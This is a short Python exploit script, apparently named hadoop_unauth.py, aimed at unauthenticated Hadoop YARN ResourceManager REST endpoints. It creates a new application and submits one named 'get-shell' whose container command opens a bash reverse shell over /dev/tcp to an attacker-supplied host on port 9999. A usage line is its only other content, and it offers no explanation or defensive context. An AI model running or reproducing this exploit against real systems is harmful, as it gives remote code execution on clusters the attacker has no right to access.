#!/usr/bin/env python
 
import requests
import sys

def expolit(target, lhost):
    url = target + 'ws/v1/cluster/apps/new-application'
    resp = requests.post(url)
    app_id = resp.json()['application-id']
    url = target + 'ws/v1/cluster/apps'
    data = {
        'application-id': app_id,
        'application-name': 'get-shell',
        'am-container-spec': {
            'commands': {
                'command': '/bin/bash -i >& /dev/tcp/%s/9999 0>&1' % lhost,
            },
        },
        'application-type': 'YARN',
    }
    requests.post(url, json=data)

if __name__ == '__main__':
    if len(sys.argv) > 2:
        expolit(sys.argv[1], sys.argv[2])
    else:
        print "python hadoop_unauth.py http://127.0.0.1:8088/  [lhost ip]"